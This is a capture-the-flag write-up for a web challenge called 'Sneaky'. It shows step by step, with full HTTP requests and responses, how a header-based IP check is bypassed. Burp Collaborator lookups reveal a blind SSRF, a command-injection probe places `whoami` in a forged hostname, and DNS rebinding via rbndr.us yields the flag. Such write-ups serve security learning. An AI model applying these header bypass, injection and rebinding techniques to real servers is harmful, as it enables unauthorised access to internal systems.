# Challenge Name: Sneaky


![date](https://img.shields.io/badge/date-26.02.2023-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-200-blue.svg)  


## Description

Think you have what it takes to crack our code? We've built this web application to be a real head-scratcher, but if you can unravel the mystery and find the hidden flag, you'll prove that you're a true master of the game. Best of luck!

[https://ideh-sneaky.chals.io](https://ideh-sneaky.chals.io/)

## Detailed solution

After visting the webpage we can see a message Not allowed

The first thing came to my mind is using headers to bypass the restriction https://gist.github.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1

After checking X-Forwarded-For i found a new response

```http
GET / HTTP/1.1
Host: ideh-sneaky.chals.io
Connection: close
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.16
Date: Mon, 27 Feb 2023 16:48:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 45
Connection: close

The DNS query name does not exist: 127.0.0.1.
```
It possible that the web application is trying to do a dns lookup. I switched to burp collaborator to test it

```http
GET / HTTP/1.1
Host: ideh-sneaky.chals.io
Connection: close
X-Forwarded-For: sa60d3wjma6d6m6yg9x2svjea5gv4k.burpcollaborator.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
We got not allowed 

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.16
Date: Mon, 27 Feb 2023 16:53:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 12
Connection: close

Not allowed.
```
If we check burp collaborator, we can see that we got a dns lookup for the web app

![image](https://user-images.githubusercontent.com/72421091/221628867-6eca300f-833c-48fb-955d-abc7ff13902c.png)

We have a blind SSRF

```
Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
```
```
Blind SSRF vulnerabilities occur when an application is making a request to a back-end server due to some reasons but the response 
is not shown on the front-end.
```
You can find more details on how to exploit SSRF https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

I did a quick test using an command injection in domain name to see how the app will react 

```
X-Forwarded-For: `whoami`.sa60d3wjma6d6m6yg9x2svjea5gv4k.burpcollaborator.net
```

We receive a new error now related to timout but dns lookup received dosen't include anyting with the subdomain 

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.16
Date: Mon, 27 Feb 2023 17:01:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 258
Connection: close

The resolution lifetime expired after 5.403 seconds: Server 127.0.0.11 UDP port 53 answered The DNS operation timed out.; Server 127.0.0.11 UDP port 53 answered The DNS operation timed out.; Server 127.0.0.11 UDP port 53 answered The DNS operation timed out.
```

I detect a differnce between sending localhost ip and a domain. When sending a domain, we got not allowed after dns lookup which means that the web app is accepting only internal adresses.

We can abuse this using an attack called DNS rebinding. We can trick the webapp by changing the ip to 127.0.01 and after the check change it to another address

We can use tool for that https://lock.cmpxchg8b.com/rebinder.html 

I put an internal ip with localhost just for checking

7f000001.c0a80001.rbndr.us

As we can see the address is changed 

![image](https://user-images.githubusercontent.com/72421091/221631899-ac3cbbad-a096-43d1-9e94-71b86294fa0a.png)

Now let's try with our app

```http
GET / HTTP/1.1
Host: ideh-sneaky.chals.io
Connection: close
X-Forwarded-For: 7f000001.c0a80001.rbndr.us
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.9.16
Date: Mon, 27 Feb 2023 17:14:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 24
Connection: close

IDEH{Tr1ky_DNS127_0_0_1}
```

We got our flag

## Flag

```
IDEH{Tr1ky_DNS127_0_0_1}
```
